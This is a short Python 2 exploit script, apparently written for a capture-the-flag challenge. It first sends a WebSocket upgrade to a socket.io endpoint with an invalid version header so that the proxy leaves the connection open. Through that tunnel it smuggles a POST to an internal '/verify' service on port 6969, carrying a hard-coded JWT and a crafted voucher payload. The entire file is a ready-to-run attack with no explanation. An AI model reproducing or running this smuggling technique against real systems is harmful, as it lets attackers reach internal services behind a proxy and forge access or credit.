import socket

req1 = '''GET /socket.io/?transport=websocket HTTP/1.1
Host: localhost:80
Sec-WebSocket-Version: 1337
Upgrade: websocket

'''.replace('\n', '\r\n')


req2 = '''POST /verify HTTP/1.1
Host: localhost:6969
Content-Length: 110
Content-Type: application/json
Autorization : Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiZW1haWwiOiIxQGNob3BjaG9wLm9yZyIsInJvbGUiOiJyZWNydWl0IiwiaWF0IjoxNjk4ODY0MzA1LCJleHAiOjE2OTg4Njc5MDV9.-_Y0m1J_h954LrFPRYyQuuqtT_n66w_5ygiTXZvdnqA


{"voucher":"qqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqdb5552521fa9ebb021a7f3ed687302504a57d2b5d3d448bb43acb4588475c17e"}

'''.replace('\n', '\r\n')



def main(netloc):
    host, port = netloc.split(':')

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((host, int(port)))

    sock.sendall(req1)
    sock.recv(4096)

    sock.sendall(req2)
    data = sock.recv(4096)
    data = data.decode(errors='ignore')

    print data

    sock.shutdown(socket.SHUT_RDWR)
    sock.close()


if __name__ == "__main__":
    main('localhost:80')